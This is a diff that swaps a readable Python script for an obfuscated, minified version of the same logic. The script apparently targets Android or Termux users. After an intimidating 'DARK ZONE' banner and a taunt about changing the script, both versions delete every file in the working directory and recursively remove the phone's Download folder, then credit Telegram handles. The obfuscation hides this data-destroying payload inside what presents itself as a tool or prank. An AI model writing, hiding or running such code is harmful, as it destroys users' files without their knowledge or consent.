@@ -1,97 +1,24 @@
-import time
-import os
-import sys
-import pyfiglet
-import shutil
-from colorama import Fore, init
-
-# Initialize colorama
+D=print
+import time as B,os as C,sys as F,pyfiglet as L,shutil as M
+from colorama import Fore as A,init
 init(autoreset=True)
-
-def main():
-    # Print welcome message in blue
-    print(Fore.BLUE + "Hey WELCOME TO DARK ZONE")
-    time.sleep(2)
-
-    # Start switching between text1 and text2
-    start_time = time.time()
-    while time.time() - start_time < 4:
-        # Print text1
-        print(Fore.BLUE + """
-⣿⣿⣿⣿⣿⣿⡟⠁⠄⠄⠄⠄⣠⣤⣴⣶⣶⣶⣶⣤⡀⠈⠙⢿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠄⠈⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⠁⠄⠄⠄⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⢺⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⡄⠄⠄⠄⠙⠻⠿⣿⣿⣿⣿⠿⠿⠛⠛⠻⣿⡄⠄⣾⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⡇⠄⠄⠁ 👁️ ⠄⢹⣿⡗⠄ 👁️ ⢄⡀⣾⢀⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⡇⠘⠄⠄⠄⢀⡀⠄⣿⣿⣷⣤⣤⣾⣿⣿⣿⣧⢸⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⡇⠄⣰⣿⡿⠟⠃⠄⣿⣿⣿⣿⣿⡛⠿⢿⣿⣷⣾⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⡄⠈⠁⠄⠄⠄⠄⠻⠿⢛⣿⣿⠿⠂⠄⢹⢹⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⡐⠐⠄⠄⣠⣀⣀⣚⣯⣵⣶⠆⣰⠄⠞⣾⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣷⡄⠄⠄⠈⠛⠿⠿⠿⣻⡏⢠⣿⣎⣾⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⡿⠟⠛⠄⠄⠄⠄⠄⠙⣛⣿⣿⣵⣿⡿⢹⡟⣿⣿⣿⣿⣿
-I am sorry brother but you are fucked now
-""")
-        time.sleep(0.1)
-        os.system('cls' if os.name == 'nt' else 'clear')
-
-        # Print text2
-        print(Fore.GREEN + """
-⠀⠀⠀⠀⠀⠀⢠⣾⣻⣻⣻⣻⠟⠛⠋⠉⠉⠉⠉⠛⢿⣷⣦⡀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⢠⣻⣻⣻⣻⣻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣻⣷⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⣾⣻⣻⣻⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⣻⡅⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⢻⣻⣻⣻⣦⣄⣀⠀⠀⠀⠀⣀⣀⣤⣤⣄⠀⢻⣻⠁⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⢸⣻⣻⣾ 👁️ ⣻⡆⠀⢨⣻ 👁️ ⡻⢿⠁⡿⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⢸⣧⣻⣻⣻⡿⢿⣻⠀⠀⠈⠛⠛⠁⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⢸⣻⠏⠀⢀⣠⣼⣻⠀⠀⠀⠀⠀⢤⣀⡀⠀⠈⠁⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢻⣷⣾⣻⣻⣻⣻⣄⣀⡤⠀⠀⣀⣽⣻⡆⡆⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⢯⣯⣻⣻⠟⠿⠿⠥⠐⠊⠉⣹⠏⣻⣡⠁⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠈⢻⣻⣻⣷⣤⣀⣀⣀⠄⢰⡟⠀⠱⠁⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢀⣠⣤⣻⣻⣻⣻⣦⠤⠀⠀⠊⠀⢀⡆⢠⠀⠀⠀⠀⠀
-I am sorry brother but you are fucked now
-""")
-        time.sleep(0.1)
-        os.system('cls' if os.name == 'nt' else 'clear')
-
-    # Print message after 4 seconds, one character at a time in color
-    message = "Why you Tried to change the script? You know it don't work when you change things brother.\n\n"
-    for char in message:
-        if char in '.,!?':
-            sys.stdout.write(Fore.YELLOW + char)
-        else:
-            sys.stdout.write(Fore.CYAN + char)
-        sys.stdout.flush()
-        time.sleep(0.1)
-    print()
-
-    # Print "I hope you understand things now?" one character at a time in color
-    for char in "I hope you understand things now?\n":
-        if char in '.,!?':
-            sys.stdout.write(Fore.YELLOW + char)
-        else:
-            sys.stdout.write(Fore.CYAN + char)
-        sys.stdout.flush()
-        time.sleep(0.1)
-    print()
-
-    # Delete all files in the directory
-    for filename in os.listdir('.'):
-        if os.path.isfile(filename):
-            os.remove(filename)
-
-    # Delete specified folder
-    folder_path = '/storage/emulated/0/Download/'
-    if os.path.exists(folder_path):
-        shutil.rmtree(folder_path)
-
-    # Print "STEIN" using pyfiglet and colorama
-    stein_art = pyfiglet.figlet_format("STEIN")
-    print(Fore.RED + stein_art)
-
-    # Additional information using colorama
-    print(Fore.BLUE + "DEVELOPER : @demonpis TELEGRAM")
-    print(Fore.BLUE + "CHANNEL: @kyixo TELEGRAM")
-
-    time.sleep(4)
-
-if __name__ == "__main__":
-    main()
+def E():
+	K='.,!?';J='clear';I='cls';D(A.BLUE+'Hey WELCOME TO DARK ZONE');B.sleep(2);N=B.time()
+	while B.time()-N<4:D(A.BLUE+'\n⣿⣿⣿⣿⣿⣿⡟⠁⠄⠄⠄⠄⣠⣤⣴⣶⣶⣶⣶⣤⡀⠈⠙⢿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠄⠈⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⠁⠄⠄⠄⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⢺⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⡄⠄⠄⠄⠙⠻⠿⣿⣿⣿⣿⠿⠿⠛⠛⠻⣿⡄⠄⣾⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⡇⠄⠄⠁ 👁️ ⠄⢹⣿⡗⠄ 👁️ ⢄⡀⣾⢀⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⡇⠘⠄⠄⠄⢀⡀⠄⣿⣿⣷⣤⣤⣾⣿⣿⣿⣧⢸⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⡇⠄⣰⣿⡿⠟⠃⠄⣿⣿⣿⣿⣿⡛⠿⢿⣿⣷⣾⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⡄⠈⠁⠄⠄⠄⠄⠻⠿⢛⣿⣿⠿⠂⠄⢹⢹⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⡐⠐⠄⠄⣠⣀⣀⣚⣯⣵⣶⠆⣰⠄⠞⣾⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣷⡄⠄⠄⠈⠛⠿⠿⠿⣻⡏⢠⣿⣎⣾⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⡿⠟⠛⠄⠄⠄⠄⠄⠙⣛⣿⣿⣵⣿⡿⢹⡟⣿⣿⣿⣿⣿\nI am sorry brother but you are fucked now\n');B.sleep(.1);C.system(I if C.name=='nt'else J);D(A.GREEN+'\n⠀⠀⠀⠀⠀⠀⢠⣾⣻⣻⣻⣻⠟⠛⠋⠉⠉⠉⠉⠛⢿⣷⣦⡀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⢠⣻⣻⣻⣻⣻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣻⣷⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⣾⣻⣻⣻⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⣻⡅⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⢻⣻⣻⣻⣦⣄⣀⠀⠀⠀⠀⣀⣀⣤⣤⣄⠀⢻⣻⠁⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⢸⣻⣻⣾ 👁️ ⣻⡆⠀⢨⣻ 👁️ ⡻⢿⠁⡿⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⢸⣧⣻⣻⣻⡿⢿⣻⠀⠀⠈⠛⠛⠁⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⢸⣻⠏⠀⢀⣠⣼⣻⠀⠀⠀⠀⠀⢤⣀⡀⠀⠈⠁⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⢻⣷⣾⣻⣻⣻⣻⣄⣀⡤⠀⠀⣀⣽⣻⡆⡆⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⢯⣯⣻⣻⠟⠿⠿⠥⠐⠊⠉⣹⠏⣻⣡⠁⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠈⢻⣻⣻⣷⣤⣀⣀⣀⠄⢰⡟⠀⠱⠁⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⢀⣠⣤⣻⣻⣻⣻⣦⠤⠀⠀⠊⠀⢀⡆⢠⠀⠀⠀⠀⠀\nI am sorry brother but you are fucked now\n');B.sleep(.1);C.system(I if C.name=='nt'else J)
+	O="Why you Tried to change the script? You know it don't work when you change things brother.\n\n"
+	for E in O:
+		if E in K:F.stdout.write(A.YELLOW+E)
+		else:F.stdout.write(A.CYAN+E)
+		F.stdout.flush();B.sleep(.1)
+	D()
+	for E in'I hope you understand things now?\n':
+		if E in K:F.stdout.write(A.YELLOW+E)
+		else:F.stdout.write(A.CYAN+E)
+		F.stdout.flush();B.sleep(.1)
+	D()
+	for G in C.listdir('.'):
+		if C.path.isfile(G):C.remove(G)
+	H='/storage/emulated/0/Download/'
+	if C.path.exists(H):M.rmtree(H)
+	P=L.figlet_format('STEIN');D(A.RED+P);D(A.BLUE+'DEVELOPER : @demonpis TELEGRAM');D(A.BLUE+'CHANNEL: @kyixo TELEGRAM');B.sleep(4)
+if __name__=='__main__':E()
